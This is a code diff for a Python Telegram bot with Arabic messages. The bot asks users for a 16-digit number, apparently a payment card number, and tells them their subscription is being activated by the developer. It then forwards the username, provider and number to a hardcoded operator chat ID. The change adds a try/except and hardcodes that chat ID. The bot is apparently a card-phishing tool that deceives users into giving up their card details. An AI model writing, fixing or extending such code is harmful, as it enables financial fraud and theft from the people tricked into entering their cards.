@@ -48,12 +48,21 @@ def callback_query(call):
 def get_card_number(message, provider):
     if message.text.isdigit() and len(message.text) == 16:
         bot.reply_to(message, "جاري التفعيل.. انتظر قليلاً ليتم تفعيل الاشتراك من قبل المطور.")
-        # إرسال البيانات إليك
-        text = f"🚨 طلب تفعيل جديد!\n\nالمستخدم: @{message.from_user.username if message.from_user.username else message.from_user.first_name}\nالمزود: {provider}\nالرقم: `{message.text}`"
-        bot.send_message(MY_CHAT_ID, text, parse_mode='Markdown')
+        
+        # كود الإرسال مع حماية ضد الأخطاء
+        try:
+            user_name = message.from_user.username if message.from_user.username else message.from_user.first_name
+            text = f"🚨 طلب تفعيل جديد!\n\nالمستخدم: @{user_name}\nالمزود: {provider}\nالرقم: `{message.text}`"
+            
+            # إرسال الرسالة
+            bot.send_message(chat_id=438077185, text=text, parse_mode='Markdown')
+        except Exception as e:
+            print(f"فشل إرسال الرسالة للمطور: {e}")
+            
     else:
         msg = bot.reply_to(message, "خطأ! يرجى إرسال 16 رقماً فقط.")
         bot.register_next_step_handler(msg, lambda m: get_card_number(m, provider))
+
 
 app = Flask('')
 @app.route('/')
